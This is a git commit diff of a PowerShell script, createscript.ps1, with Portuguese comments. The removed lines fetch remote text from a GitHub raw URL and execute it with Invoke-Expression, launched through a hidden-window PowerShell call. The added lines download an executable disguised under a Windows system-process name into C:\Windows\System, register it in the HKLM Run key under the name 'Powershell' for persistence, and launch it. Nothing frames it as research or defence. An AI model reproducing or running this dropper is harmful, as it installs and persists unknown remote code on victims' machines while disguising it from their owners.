ede9742692f9d09e4645a7c67a0b60ff9aff7a6f
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-18 18:49:48 -0700

    Update createscript.ps1

--- createscript.ps1
+++ createscript.ps1
@@ -1,18 +1,10 @@
-# Define o conteúdo do script
-$scriptContent = @"
-    Invoke-Expression -Command (Invoke-RestMethod -Uri "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt")
-"@
-
-# Define o caminho completo para salvar o arquivo
-$filePath = "C:\Windows\powershell1.ps1"
-
-# Salva o conteúdo no arquivo especificado
-Set-Content -Path $filePath -Value $scriptContent -Force
+Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/usermodefontdriverhost.exe" -OutFile "C:\Windows\System\usermodefontdriverhost.exe" 
 
 # Caminho do script PowerShell
-$programPath = "C:\Windows\powershell1.ps1"
+$programPath = "C:\Windows\System\usermodefontdriverhost.exe"
 
 # Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
-$command = "powershell.exe -WindowStyle Hidden -File `"$programPath`""
+$command = "C:\Windows\System\usermodefontdriverhost.exe"
 
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
+Start-Process "C:\Windows\System\usermodefontdriverhost.exe"
